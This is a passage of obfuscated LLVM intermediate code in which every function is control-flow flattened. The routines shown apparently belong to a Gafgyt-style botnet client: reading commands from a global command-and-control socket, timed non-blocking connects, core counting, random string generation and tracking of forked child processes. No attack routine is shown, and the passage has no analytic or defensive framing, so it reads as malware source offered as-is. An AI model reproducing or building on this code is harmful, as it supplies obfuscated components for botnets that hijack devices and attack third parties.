  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 2067740059, i32 -898323089
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 2067740059, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 -230211466, i32 -67702161
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 1723569659, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1285935710, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 1622228856, i32 1970873847
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 1622228856, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 732825278, i32 1271086813
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 -1285935710, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 -1371835440, i32 1781144268
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 1781144268, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 1707074726, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -1860605244, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 1707074726, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 1740529911, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1740529911, label %5
    i32 1386423568, label %11
    i32 -120724160, label %18
    i32 1502908594, label %21
    i32 -1803089273, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 1386423568, i32 -1803089273
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 -120724160, i32 1502908594
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 1502908594, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 1740529911, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1953947067, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1953947067, label %6
    i32 1627681241, label %11
    i32 -1076959342, label %20
    i32 -722870744, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 1627681241, i32 -722870744
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1076959342, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1953947067, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -2057163131, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2057163131, label %24
    i32 -572936698, label %33
    i32 656254299, label %50
    i32 751277901, label %51
    i32 374788580, label %55
    i32 -851739629, label %60
    i32 -1167527958, label %69
    i32 -218737232, label %86
    i32 626097027, label %89
    i32 1687248099, label %90
    i32 17318482, label %91
    i32 1164398044, label %93
    i32 780583768, label %98
    i32 2085009004, label %103
    i32 -1325075199, label %105
    i32 1570415317, label %113
    i32 -2094392758, label %114
    i32 61154025, label %117
    i32 -1643360691, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -572936698, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 656254299, i32 17318482
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 751277901, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 374788580, i32 1687248099
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -851739629, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 -1167527958, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -218737232, i32 626097027
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 751277901, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 1687248099, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 17318482, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 1164398044, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 780583768, i32 61154025
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 2085009004, i32 -1325075199
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1643360691, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 1570415317, i32 -2094392758
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 61154025, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 1164398044, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -1643360691, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1885084621, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1885084621, label %first
    i32 -542125001, label %37
    i32 -813079864, label %38
    i32 -74335254, label %47
    i32 -280929217, label %52
    i32 -1766181910, label %57
    i32 1268057008, label %66
    i32 973422044, label %83
    i32 -1191331423, label %90
    i32 1873787047, label %91
    i32 494893432, label %92
    i32 -670224296, label %93
    i32 -925794814, label %94
    i32 -1486290826, label %95
    i32 1243928899, label %96
    i32 1209839021, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -542125001, i32 -813079864
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1209839021, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -74335254, i32 1243928899
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -280929217, i32 -925794814
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1766181910, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 1268057008, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 973422044, i32 494893432
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -1191331423, i32 1873787047
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1209839021, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -670224296, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1209839021, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1486290826, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1209839021, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1243928899, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 1209839021, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 722523770, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 722523770, label %first
    i32 184982032, label %9
    i32 1279879070, label %11
    i32 -1367172892, label %19
    i32 -1754241552, label %26
    i32 1193351975, label %36
    i32 -1186973874, label %39
    i32 -1823615412, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 184982032, i32 1279879070
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1823615412, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1367172892, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -1754241552, i32 -1186973874
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 1193351975, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1367172892, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1823615412, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
